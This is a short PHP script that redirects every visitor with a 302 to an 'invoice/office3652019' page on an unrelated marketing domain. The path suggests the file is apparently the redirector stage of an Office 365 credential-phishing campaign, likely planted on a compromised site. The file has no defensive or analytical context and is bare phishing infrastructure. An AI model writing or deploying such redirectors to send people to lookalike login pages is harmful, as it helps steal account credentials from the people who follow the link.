<?php


function Redirect($url, $permanent = false)
{
 if (headers_sent() === false)
 {
 header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
 }

 exit();
}

Redirect("https://leadingedgemarketing.com.au/invoice/office3652019/cymk/index.php?
", false);

?>